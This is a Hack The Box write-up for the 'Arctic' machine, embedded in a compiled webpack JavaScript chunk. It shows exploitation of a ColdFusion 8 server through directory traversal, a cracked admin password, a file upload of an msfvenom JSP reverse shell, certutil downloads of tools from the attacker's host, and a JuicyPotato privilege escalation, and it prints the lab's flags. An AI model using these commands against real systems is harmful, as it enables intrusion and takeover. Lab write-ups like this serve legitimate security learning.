(window.webpackJsonp=window.webpackJsonp||[]).push([[66],{406:function(a,s,t){"use strict";t.r(s);var e=t(13),r=Object(e.a)({},(function(){var a=this,s=a._self._c;return s("ContentSlotsDistributor",{attrs:{"slot-key":a.$parent.slotKey}},[s("h1",{attrs:{id:"arctic"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#arctic"}},[a._v("#")]),a._v(" Arctic")]),a._v(" "),s("p",[a._v("Address: "),s("code",[a._v("10.10.10.11")])]),a._v(" "),s("h2",{attrs:{id:"recon"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#recon"}},[a._v("#")]),a._v(" Recon")]),a._v(" "),s("ul",[s("li",[a._v("platform is windows")]),a._v(" "),s("li",[a._v("135 msrpc")]),a._v(" "),s("li",[a._v("8500 fmtp?")]),a._v(" "),s("li",[a._v("49154 rpc")])]),a._v(" "),s("p",[a._v("When visiting the port "),s("code",[a._v("8500")]),a._v(", we actually get a directory with files listed.")]),a._v(" "),s("p",[a._v("Navigating to "),s("code",[a._v("http://10.10.10.11:8500/CFIDE/administrator/")]),a._v(" yields us with a coldfusion 8 server.")]),a._v(" "),s("h2",{attrs:{id:"coldfusion-8"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#coldfusion-8"}},[a._v("#")]),a._v(" Coldfusion 8")]),a._v(" "),s("p",[a._v("The server is running coldfusion8. A known vulnerability on coldFusion 8 is directory traversal on "),s("a",{attrs:{href:"https://www.exploit-db.com/exploits/14641",target:"_blank",rel:"noopener noreferrer"}},[a._v("exploitdb"),s("OutboundLink")],1)]),a._v(" "),s("p",[a._v("Then we get the hashes the password:")]),a._v(" "),s("div",{staticClass:"language-sh extra-class"},[s("pre",{pre:!0,attrs:{class:"language-sh"}},[s("code",[a._v("Username: admin\nPassword: 2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03 "),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v("=")]),a._v(" happyday\n")])])]),s("p",[a._v("logging into the control panel, it is possible to upload a file in scheduled tasks since there is an RFI vulnerability there.")]),a._v(" "),s("p",[a._v("Using a python script found online for the file upload:")]),a._v(" "),s("p",[a._v("Create the payload:")]),a._v(" "),s("div",{staticClass:"language-sh extra-class"},[s("pre",{pre:!0,attrs:{class:"language-sh"}},[s("code",[a._v("msfvenom "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-p")]),a._v(" java/jsp_shell_reverse_tcp "),s("span",{pre:!0,attrs:{class:"token assign-left variable"}},[a._v("LHOST")]),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v("=")]),s("span",{pre:!0,attrs:{class:"token number"}},[a._v("10.10")]),a._v(".14.27 "),s("span",{pre:!0,attrs:{class:"token assign-left variable"}},[a._v("LPORT")]),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v("=")]),s("span",{pre:!0,attrs:{class:"token number"}},[a._v("443")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v(">")]),a._v(" shell.jsp\n")])])]),s("p",[a._v("then run the arbitrary file upload script")]),a._v(" "),s("div",{staticClass:"language-sh extra-class"},[s("pre",{pre:!0,attrs:{class:"language-sh"}},[s("code",[a._v("python coldfusion_afi.py "),s("span",{pre:!0,attrs:{class:"token number"}},[a._v("10.10")]),a._v(".10.11 "),s("span",{pre:!0,attrs:{class:"token number"}},[a._v("8500")]),a._v(" /home/omar2535/HTB/results/10.10.10.11/exploit/shell.jsp\n")])])]),s("p",[a._v("And now with a netcat listener on 443, we get a reverse shell")]),a._v(" "),s("p",[a._v("User.txt: "),s("code",[a._v("02650d3a69a70780c302e146a6cb96f3")])]),a._v(" "),s("h2",{attrs:{id:"priv-esc"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#priv-esc"}},[a._v("#")]),a._v(" Priv esc")]),a._v(" "),s("div",{staticClass:"language-sh extra-class"},[s("pre",{pre:!0,attrs:{class:"language-sh"}},[s("code",[a._v("certutil.exe "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-urlcache")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-split")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-f")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token string"}},[a._v('"http://10.10.14.27/winPEAS.bat"')]),a._v(" C:"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("\\")]),a._v("Users"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("\\")]),a._v("tolis"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("\\")]),a._v("Desktop"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("\\")]),a._v("winPEAS.bat\n")])])]),s("p",[a._v("Find that juicy potato exploit is available")]),a._v(" "),s("p",[a._v("Generate shell for it")]),a._v(" "),s("div",{staticClass:"language-sh extra-class"},[s("pre",{pre:!0,attrs:{class:"language-sh"}},[s("code",[a._v("msfvenom "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-p")]),a._v(" windows/shell_reverse_tcp "),s("span",{pre:!0,attrs:{class:"token assign-left variable"}},[a._v("LHOST")]),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v("=")]),s("span",{pre:!0,attrs:{class:"token number"}},[a._v("10.10")]),a._v(".14.27 "),s("span",{pre:!0,attrs:{class:"token assign-left variable"}},[a._v("LPORT")]),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v("=")]),s("span",{pre:!0,attrs:{class:"token number"}},[a._v("5555")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-f")]),a._v(" exe "),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v(">")]),a._v(" shell.exe\n")])])]),s("p",[a._v("Transfer required files over")]),a._v(" "),s("div",{staticClass:"language-sh extra-class"},[s("pre",{pre:!0,attrs:{class:"language-sh"}},[s("code",[a._v("certutil.exe "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-urlcache")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-split")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-f")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token string"}},[a._v('"http://10.10.14.27/JuicyPotato.exe"')]),a._v(" C:"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("\\")]),a._v("Users"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("\\")]),a._v("tolis"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("\\")]),a._v("Desktop"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("\\")]),a._v("JuicyPotato.exe\n")])])]),s("div",{staticClass:"language-sh extra-class"},[s("pre",{pre:!0,attrs:{class:"language-sh"}},[s("code",[a._v("certutil.exe "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-urlcache")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-split")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-f")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token string"}},[a._v('"http://10.10.14.27/shell.exe"')]),a._v(" C:"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("\\")]),a._v("Users"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("\\")]),a._v("tolis"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("\\")]),a._v("Desktop"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("\\")]),a._v("shell.exe\n")])])]),s("p",[a._v("Fire it off with a netcat listener on "),s("code",[a._v("5555")]),a._v(":")]),a._v(" "),s("div",{staticClass:"language-sh extra-class"},[s("pre",{pre:!0,attrs:{class:"language-sh"}},[s("code",[a._v("JuicyPotato.exe "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-t")]),a._v(" t "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-p")]),a._v(" C:"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("\\")]),a._v("Users"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("\\")]),a._v("tolis"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("\\")]),a._v("Desktop"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("\\")]),a._v("shell.exe "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-l")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token number"}},[a._v("5837")]),a._v("\n")])])]),s("p",[a._v("And root is obtained.")]),a._v(" "),s("p",[a._v("Root.txt: "),s("code",[a._v("ce65ceee66b2b5ebaff07e50508ffb90")])])])}),[],!1,null,null,null);s.default=r.exports}}]);